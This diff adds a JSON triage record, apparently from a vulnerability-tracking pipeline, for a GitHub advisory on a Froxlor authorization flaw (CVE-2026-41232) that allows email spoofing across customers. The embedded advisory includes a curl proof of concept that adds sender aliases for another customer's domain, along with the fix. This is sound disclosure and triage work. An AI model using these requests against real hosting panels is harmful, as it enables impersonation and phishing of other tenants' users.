@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/114768995?v=4\", \"events_url\": \"https://api.github.com/users/offset/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/offset/followers\", \"following_url\": \"https://api.github.com/users/offset/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/offset/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/offset\", \"id\": 114768995, \"login\": \"offset\", \"node_id\": \"U_kgDOBtc8Yw\", \"organizations_url\": \"https://api.github.com/users/offset/orgs\", \"received_events_url\": \"https://api.github.com/users/offset/received_events\", \"repos_url\": \"https://api.github.com/users/offset/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/offset/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/offset/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/offset\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-41232\", \"cvss\": {\"score\": 5.0, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.0, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-863\", \"name\": \"Incorrect Authorization\"}], \"description\": \"## Summary\\n\\nIn `EmailSender::add()`, the domain ownership validation for full email sender aliases uses the wrong array index when splitting the email address, passing the local part instead of the domain to `validateLocalDomainOwnership()`. This causes the ownership check to always pass for non-existent \\\"domains,\\\" allowing any authenticated customer to add sender aliases for email addresses on domains belonging to other customers. Postfix's `sender_login_maps` then authorizes the attacker to send emails as those addresses.\\n\\n## Details\\n\\nIn `lib/Froxlor/Api/Commands/EmailSender.php` at line 100, when a customer adds a full email address (not a `@domain` wildcard) as an allowed sender, the code splits on `@` and takes index `[0]`:\\n\\n```php\\n// Line 96-106\\nif (substr($allowed_sender, 0, 1) != '@') {\\n    if (!Validate::validateEmail($idna_convert->encode($allowed_sender))) {\\n        Response::standardError('emailiswrong', $allowed_sender, true);\\n    }\\n    self::validateLocalDomainOwnership(explode(\\\"@\\\", $allowed_sender)[0] ?? \\\"\\\");  // BUG: [0] is the local part\\n} else {\\n    if (!Validate::validateDomain($idna_convert->encode(substr($allowed_sender, 1)))) {\\n        Response::standardError('wildcardemailiswrong', substr($allowed_sender, 1), true);\\n    }\\n    self::validateLocalDomainOwnership(substr($allowed_sender, 1));  // CORRECT: passes domain\\n}\\n```\\n\\nFor input `admin@domain-b.com`, `explode(\\\"@\\\", \\\"admin@domain-b.com\\\")` returns `[\\\"admin\\\", \\\"domain-b.com\\\"]`. Index `[0]` is `\\\"admin\\\"` — the local part, not the domain.\\n\\nThe `validateLocalDomainOwnership()` function (lines 346-355) then queries `panel_domains` for a domain matching `\\\"admin\\\"`:\\n\\n```php\\nprivate static function validateLocalDomainOwnership(string $domain): void\\n{\\n    $sel_stmt = Database::prepare(\\\"SELECT customerid FROM `\\\" . TABLE_PANEL_DOMAINS . \\\"` WHERE `domain` = :domain\\\");\\n    $domain_result = Database::pexecute_first($sel_stmt, ['domain' => $domain]);\\n    if ($domain_result && $domain_result['customerid'] != CurrentUser::getField('customerid')) {\\n        Response::standardError('senderdomainnotowned', $domain, true);\\n    }\\n}\\n```\\n\\nSince no domain named `\\\"admin\\\"` exists in `panel_domains`, `$domain_result` is false, and the function returns without error — the ownership check silently passes.\\n\\nThe inserted `mail_sender_aliases` row is then picked up by Postfix's `sender_login_maps` query (configured in `mysql-virtual_sender_permissions.cf`):\\n\\n```sql\\n... UNION (SELECT mail_sender_aliases.email FROM mail_sender_aliases\\nWHERE mail_sender_aliases.allowed_sender = '%s') ...\\n```\\n\\nThis query maps the `allowed_sender` back to the mail user, authorizing them to send as that address via SMTP.\\n\\n## PoC\\n\\n```bash\\n# Prerequisites: Froxlor instance with mail.enable_allow_sender enabled,\\n# two customers: Customer A (owns domain-a.com) and Customer B (owns domain-b.com)\\n\\n# Step 1: As Customer A, add a sender alias claiming Customer B's domain\\n# Via API:\\ncurl -X POST 'https://froxlor-host/api/v1/' \\\\\\n  -H 'Authorization: Basic <customer-A-credentials>' \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -d '{\\n    \\\"command\\\": \\\"EmailSender.add\\\",\\n    \\\"params\\\": {\\n      \\\"emailaddr\\\": \\\"myaccount@domain-a.com\\\",\\n      \\\"allowed_sender\\\": \\\"ceo@domain-b.com\\\"\\n    }\\n  }'\\n\\n# Expected: Error \\\"senderdomainnotowned\\\" because domain-b.com belongs to Customer B\\n# Actual: 200 OK — alias is created because validateLocalDomainOwnership\\n#         receives \\\"ceo\\\" (local part) instead of \\\"domain-b.com\\\" (domain)\\n\\n# Step 2: Verify the alias was inserted\\ncurl -X POST 'https://froxlor-host/api/v1/' \\\\\\n  -H 'Authorization: Basic <customer-A-credentials>' \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -d '{\\n    \\\"command\\\": \\\"EmailSender.listing\\\",\\n    \\\"params\\\": {\\\"emailaddr\\\": \\\"myaccount@domain-a.com\\\"}\\n  }'\\n\\n# Step 3: Customer A can now send email as ceo@domain-b.com via SMTP\\n# because Postfix sender_login_maps will match the mail_sender_aliases entry\\n# and authorize Customer A's mail account to use that sender address.\\n```\\n\\nThe same attack works via the web UI by POST-ing to `customer_email.php` with `action=add_sender` and the target domain in `allowed_domain`.\\n\\n## Impact\\n\\nAny authenticated customer on a multi-tenant Froxlor instance can add sender aliases for email addresses on domains belonging to other customers. This allows:\\n\\n- **Cross-customer email spoofing**: Send emails impersonating users on other customers' domains, bypassing Postfix's `smtpd_sender_login_maps` restriction that is specifically designed to prevent this.\\n- **Multi-tenant isolation breach**: The domain ownership check (`validateLocalDomainOwnership`) is the only barrier preventing cross-customer sender aliasing, and it is completely ineffective for full email addresses.\\n- **Phishing and reputation damage**: Spoofed emails originate from the legitimate mail server, passing SPF/DKIM checks for the target domain if those records point to the Froxlor server.\\n\\nNote: The wildcard (`@domain`) code path at line 105 is **not** affected — it correctly passes the domain to `validateLocalDomainOwnership()`.\\n\\n## Recommended Fix\\n\\nChange index `[0]` to `[1]` on line 100 of `lib/Froxlor/Api/Commands/EmailSender.php`:\\n\\n```php\\n// Before (line 100):\\nself::validateLocalDomainOwnership(explode(\\\"@\\\", $allowed_sender)[0] ?? \\\"\\\");\\n\\n// After:\\nself::validateLocalDomainOwnership(explode(\\\"@\\\", $allowed_sender)[1] ?? \\\"\\\");\\n```\\n\\nThis ensures the domain part of the email address is passed to the ownership validation, matching the behavior of the wildcard path on line 105.\", \"epss\": {\"percentage\": 0.00231, \"percentile\": 0.13653}, \"ghsa_id\": \"GHSA-vmjj-qr7v-pxm6\", \"github_reviewed_at\": \"2026-04-16T00:47:05Z\", \"html_url\": \"https://github.com/advisories/GHSA-vmjj-qr7v-pxm6\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-vmjj-qr7v-pxm6\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-41232\"}], \"nvd_published_at\": \"2026-04-23T05:16:05Z\", \"published_at\": \"2026-04-16T00:47:05Z\", \"references\": [\"https://github.com/froxlor/froxlor/security/advisories/GHSA-vmjj-qr7v-pxm6\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-41232\", \"https://github.com/froxlor/froxlor/commit/77d04badf549d5f8429828f0fbc69bc37a35e07a\", \"https://github.com/froxlor/froxlor/releases/tag/2.3.6\", \"https://github.com/advisories/GHSA-vmjj-qr7v-pxm6\"], \"repository_advisory_url\": \"https://api.github.com/repos/froxlor/froxlor/security-advisories/GHSA-vmjj-qr7v-pxm6\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/froxlor/froxlor\", \"summary\": \"Froxlor has an Email Sender Alias Domain Ownership Bypass via Wrong Array Index Allows Cross-Customer Email Spoofing\", \"type\": \"reviewed\", \"updated_at\": \"2026-04-24T20:54:30Z\", \"url\": \"https://api.github.com/advisories/GHSA-vmjj-qr7v-pxm6\", \"vulnerabilities\": [{\"first_patched_version\": \"2.3.6\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"froxlor/froxlor\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 2.3.6\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-vmjj-qr7v-pxm6",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "froxlor/froxlor: < 2.3.6"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-41232"
+    ],
+    "cvss_score": 5.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "froxlor/froxlor"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:04.659584Z",
+  "provenance": {
+    "content_sha256": "3d8c596d0b34b20729cb2a88d03dc162f4791b8b424dcc47034c84162edaad75",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-04-16T00:47:05Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-vmjj-qr7v-pxm6",
+  "status": "active",
+  "title": "Froxlor has an Email Sender Alias Domain Ownership Bypass via Wrong Array Index Allows Cross-Customer Email Spoofing",
+  "updated_at": "2026-04-24T20:54:30Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-vmjj-qr7v-pxm6"
+}
